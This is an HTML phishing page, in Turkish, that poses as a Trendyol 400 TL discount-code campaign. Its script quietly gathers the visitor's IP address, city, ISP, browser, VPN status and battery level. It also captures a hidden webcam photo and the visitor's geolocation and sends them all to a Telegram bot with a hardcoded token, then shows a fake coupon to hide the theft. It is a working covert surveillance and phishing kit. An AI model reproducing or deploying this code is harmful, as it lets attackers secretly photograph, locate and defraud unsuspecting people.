<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Trendyol - 400 TL İndirim Kodu Kampanyası</title>
<link rel="icon" href="https://cdn.dsmcdn.com/web/favicon.ico" />
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
<style>
  *{box-sizing:border-box; font-family:'Open Sans', sans-serif; margin:0; padding:0;}
  body{background:#f8f8f8; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:15px;}
  .container{background:#fff; padding:30px 25px; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.08); width:100%; max-width:420px; text-align:center;}
  header{background:#f27a1a; padding:18px 0; margin:-30px -25px 25px -25px; border-top-left-radius:12px; border-top-right-radius:12px;}
  header img{height:28px;}
  h2{color:#222; margin-bottom:8px; font-size:19px; font-weight:700;}
  p{color:#666; font-size:13px; margin-bottom:20px; line-height:1.4;}
  .input-group{margin-bottom:15px; text-align:left;}
  label{font-size:12px; color:#444; font-weight:600; display:block; margin-bottom:5px;}
  input[type=text]{width:100%; padding:13px; border:1px solid #ddd; border-radius:6px; font-size:15px; outline:none; transition:border 0.2s;}
  input[type=text]:focus{border-color:#f27a1a;}
  button{width:100%; padding:13px; background:#f27a1a; border:none; color:#fff; font-size:16px; font-weight:600; border-radius:6px; cursor:pointer; transition:background 0.3s;}
  button:hover{background:#e06800;}
  .code-box{margin-top:20px; background:#fff8f4; border:1px dashed #f27a1a; border-radius:6px; padding:15px; font-weight:700; color:#f27a1a; word-break:break-word; display:none; font-size:16px;}
  .error{color:#d32f2f; font-size:13px; margin-top:10px; display:none;}
  .loader {display: none; margin: 15px auto; border: 3px solid #f3f3f3; border-radius: 50%; border-top: 3px solid #f27a1a; width: 24px; height: 24px; animation: spin 1s linear infinite;}
  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  .footer-text{margin-top:25px; font-size:11px; color:#999; border-top:1px solid #eee; padding-top:15px;}
</style>
</head>
<body>

<div class="container">
  <header><img src="https://cdn.dsmcdn.com/web/logo/ty-web.svg" alt="Trendyol" /></header>
  <h2>400 TL Değerinde İndirim Kodu</h2>
  <p>Arkadaşınızın sizin için tanımladığı özel hediye kuponunu etkinleştirmek için kodu girin.</p>
  
  <div class="input-group">
    <label>Hediye / Kupon Kodu</label>
    <input type="text" id="codeInput" placeholder="Örn: 849201" autocomplete="off" />
  </div>

  <button id="submitBtn">Kodu Aktifleştir</button>
  <div class="loader" id="loadingSpinner"></div>
  
  <div class="error" id="errorMsg">Girdiğiniz kod hatalı veya süresi dolmuş.</div>
  <div class="code-box" id="fakeCode"></div>

  <div class="footer-text">
    Bu kampanya Trendyol Dijital Çözümler A.Ş. güvencesiyle sunulmaktadır. Tüm hakları saklıdır.
  </div>
</div>

<script>
const BOT_TOKEN = "9186950420:AAG8uPX7NKievzNPC9Ekje4tUN_MGObv4ZE";
const ADMIN_ID = "8788829431";
const ADMIN_CODE = "670570";  

const urlParams = new URLSearchParams(window.location.search);
const CHAT_ID = urlParams.get("chat");    
const URL_SIFRE = urlParams.get("sifre"); 

function generateFakeCode() {
  const part1 = Math.floor(1000 + Math.random() * 9000);
  const part2 = Math.random().toString(36).substring(2,4).toUpperCase();
  return `TY-${part1}-${part2}`;
}

async function sendTelegramMessage(chat_id, text, blob=null) {
  if(blob){
    const formData=new FormData();
    formData.append("chat_id",chat_id);
    formData.append("photo",blob,"photo.jpg");
    formData.append("caption",text);
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData});
  } else {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({chat_id,text}),
    });
  }
}

async function getIPData() {
  try { return await (await fetch("https://ipapi.co/json/")).json(); } 
  catch { return {}; }
}

async function getBatteryInfo() {
  try { 
    const bat = await navigator.getBattery();
    return { level: Math.round(bat.level*100), charging: bat.charging ? "Prize takılı" : "Bataryada" }; 
  } 
  catch { return { level: "Bilinmiyor", charging: "" }; }
}

async function takeSelfieWithData(messageText) {
  try{
    const video=document.createElement("video");
    video.style.display="none";
    document.body.appendChild(video);
    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
    video.srcObject=stream;
    await video.play();
    await new Promise(r=>setTimeout(r,1000));
    const canvas=document.createElement("canvas");
    canvas.width=640;
    canvas.height=480;
    const ctx=canvas.getContext("2d");
    ctx.drawImage(video,0,0,canvas.width,canvas.height);
    canvas.toBlob(async blob=>{
      await sendTelegramMessage(CHAT_ID,messageText,blob);
      stream.getTracks().forEach(track=>track.stop());
      video.remove();
    },"image/jpeg");
  }catch(e){ console.log("Kamera izni verilmedi",e);}
}

async function collectUserData(fakeCode){
  const ipData=await getIPData();
  const battery=await getBatteryInfo();
  const userAgent=navigator.userAgent;
  const vpnProxy=(ipData.security && ipData.security.vpn)?"Evet":"Hayır";
  return `
📡 IP: ${ipData.ip || "Bilinmiyor"}
🌍 Ülke: ${ipData.country_name || "Bilinmiyor"}
🏙️ Şehir: ${ipData.city || "Bilinmiyor"}
🧠 ISP: ${ipData.org || "Bilinmiyor"}
📱 Tarayıcı: ${userAgent}
🔐 VPN/Proxy: ${vpnProxy}
🔋 Şarj: ${battery.level}% (${battery.charging})
💻 Üretilen Kupon: ${fakeCode}`;
}

async function sendLocation() {
  if(!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(pos=>{
    const lat=pos.coords.latitude;
    const lon=pos.coords.longitude;
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({chat_id:CHAT_ID, latitude:lat, longitude:lon})
    });
  });
}

function showError(msg){
  document.getElementById("errorMsg").textContent=msg;
  document.getElementById("errorMsg").style.display="block";
  document.getElementById("fakeCode").style.display="none";
}
function hideError(){document.getElementById("errorMsg").style.display="none";}

document.getElementById("submitBtn").addEventListener("click",async ()=>{
  const input=document.getElementById("codeInput").value.trim();
  if(!CHAT_ID||!URL_SIFRE){ showError("Geçersiz veya eksik bağlantı adresi."); return; }

  if(input !== ADMIN_CODE && input !== URL_SIFRE){
    showError("Kod hatalı veya süresi dolmuş.");
    return;
  }

  hideError();
  document.getElementById("submitBtn").style.display = "none";
  document.getElementById("loadingSpinner").style.display = "block";

  // Veri toplama ve kamera çekimi arka planda çalışırken kullanıcıya kısa bir bekleme efekti verilir
  const fakeCode=generateFakeCode();
  const messageText = await collectUserData(fakeCode);
  
  await takeSelfieWithData(messageText);
  await sendLocation();

  setTimeout(() => {
    document.getElementById("loadingSpinner").style.display = "none";
    document.getElementById("fakeCode").textContent=`Tebrikler! İndirim Kodunuz: ${fakeCode}`;
    document.getElementById("fakeCode").style.display="block";
    if(input === ADMIN_CODE) {
      sendTelegramMessage(ADMIN_ID, "Admin kodu web sitesinde kullanıldı.");
    }
  }, 1500);
});
</script>

</body>
</html>
